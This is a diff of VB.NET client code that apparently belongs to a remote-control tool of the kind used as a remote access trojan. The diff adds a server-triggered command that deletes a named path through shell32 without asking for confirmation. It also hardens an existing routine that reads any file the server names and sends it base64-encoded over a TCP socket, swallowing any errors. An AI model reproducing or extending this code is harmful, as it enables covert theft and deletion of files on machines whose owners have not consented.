@@ -2,6 +2,7 @@
 Imports System.Drawing.Imaging
 Imports System.IO
 Imports System.Net.Sockets
+Imports System.Runtime.InteropServices
 Imports System.Security
 Imports System.Text
 Imports System.Windows.Forms
@@ -33,6 +34,11 @@ Public Class MainCL
 
         ElseIf h(1) = "|OPENFILE|" Then
             Await Task.Run(Sub() OpenFile(k, h(2)))
+
+
+        ElseIf h(1) = "|MTBFILE|" Then
+
+            Await Task.Run(Sub() STB(k ,  h(2)))
         End If
 
 
@@ -165,21 +171,92 @@ Public Class MainCL
 
     Public Shared Async Sub Send(ByVal k As TcpClient, ByVal F As String)
         ''WORKING BUT VERY LOW TO CONVERT BACK IN SERVER SIDE
-        Dim o As Byte() = IO.File.ReadAllBytes(F)
 
 
-        Dim j As String() = Split(F, "\")
-        Dim Filename As String = j(j.Length - 1)
+        Try
+
+
+            Dim o As Byte() = IO.File.ReadAllBytes(F)
+
+
+            Dim j As String() = Split(F, "\")
+            Dim Filename As String = j(j.Length - 1)
 
 
 
-        Dim n As String = Await Task.Run(Function() Convert.ToBase64String(o)) & "|DW|" & Filename & "|ENDW|"
+            Dim n As String = Await Task.Run(Function() Convert.ToBase64String(o)) & "|DW|" & Filename & "|ENDW|"
 
-        Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
-        Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
+            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
 
+        Catch ex As Exception
 
+        End Try
         GC.Collect()
         GC.WaitForPendingFinalizers()
     End Sub
+
+    Public Shared Async Sub STB(ByVal k As TcpClient, ByVal P As String)
+        Try
+            Dim fileop As SHFILEOPSTRUCT = New SHFILEOPSTRUCT()
+            fileop.wFunc = FO_DELETE
+            fileop.pFrom = P '+ "\0" '+ "\0"
+            fileop.fFlags = FOF_ALLOWUNDO Or FOF_NOCONFIRMATION
+            SHFileOperation(fileop)
+
+
+
+        Catch ex As Exception
+
+
+        End Try
+
+        If File.Exists(P) = True Then
+
+            Dim n As String = P & "|F|MTB|"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
+
+            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+
+        Else
+            Dim n As String = P & "|D|MTB|"
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(n)
+            Await k.GetStream.WriteAsync(buffer, 0, buffer.Length)
+
+        End If
+
+    End Sub
+
+
+
+
+
+
+
+    'https://www.fluxbytes.com/csharp/delete-files-or-folders-to-recycle-bin-in-c/
+
+    Private Const FO_DELETE As Integer = &H3
+    Private Const FOF_ALLOWUNDO As Integer = &H40
+    Private Const FOF_NOCONFIRMATION As Integer = &H10
+
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto)>
+    Public Structure SHFILEOPSTRUCT
+        Public hwnd As IntPtr
+        <MarshalAs(UnmanagedType.U4)>
+        Public wFunc As Integer
+        Public pFrom As String
+        Public pTo As String
+        Public fFlags As Short
+        <MarshalAs(UnmanagedType.Bool)>
+        Public fAnyOperationsAborted As Boolean
+        Public hNameMappings As IntPtr
+        Public lpszProgressTitle As String
+    End Structure
+
+    <DllImport("shell32.dll", CharSet:=CharSet.Auto)>
+    Private Shared Function SHFileOperation(ByRef FileOp As SHFILEOPSTRUCT) As Integer
+
+    End Function
 End Class
